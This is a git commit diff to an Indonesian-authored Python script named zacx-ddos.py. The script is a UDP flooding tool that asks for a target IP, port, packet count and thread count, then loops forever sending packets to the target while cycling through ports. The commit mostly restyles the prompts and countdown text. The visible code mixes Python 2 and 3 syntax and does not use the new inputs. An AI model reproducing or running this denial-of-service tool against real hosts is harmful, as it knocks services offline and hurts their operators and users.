d67c15cebb4a2e78db938428980e375b77fc2eab
OZKON24 <za9474@yahoo.com>
2024-11-26 02:45:11 +0700

    Update zacx-ddos.py

--- zacx-ddos.py
+++ zacx-ddos.py
@@ -28,19 +28,28 @@ print("\033[30m   ⁰ ⁰ ⁰ ⁰        ⁰        \033[0m")
 print ("\033[01mAuthor   : Z4CX-DDOS\033[0m")
 print ("\033[01mgithub   : https://github.com/Z4CX-DDOS\033[0m")
 print("")
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
+print("\033[33m———————————————————————————⟩⟩")
+port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
+print("\033[32m———————————————————————————⟩⟩")
+packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
+print("\033[31m———————————————————————————⟩⟩")
+thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
+print("\033[94m———————————————————————————⟩⟩"),
+time.sleep(5),
+print("\033[96m              ⟩⟩ 1 \033[0m "),
+time.sleep(5),
+print("\033[92m              ⟩⟩ 2 \033[0m "),
+time.sleep(5),
+print("\033[1m              ⟩⟩ 3 \033[0m "),
+time.sleep(5),
+print("\033[97m              ⟩⟩ 4 \033[0m "),
+time.sleep(5),
+print("\033[95m              ⟩⟩ 5 \033[0m "),
+time.sleep(5),
+time.sleep(5),
+print("\033[96m              ⟩⟩ MENUNGGU KONEKSI SERVER <<\033[0m "),
 
-print ("[                    ] 0% ")
-time.sleep(5)
-print ("[=====               ] 25%")
-time.sleep(5)
-print ("[==========          ] 50%")
-time.sleep(5)
-print ("[===============     ] 75%")
-time.sleep(5)
-print ("[====================] 100%")
-time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
@@ -49,3 +58,5 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
+
+
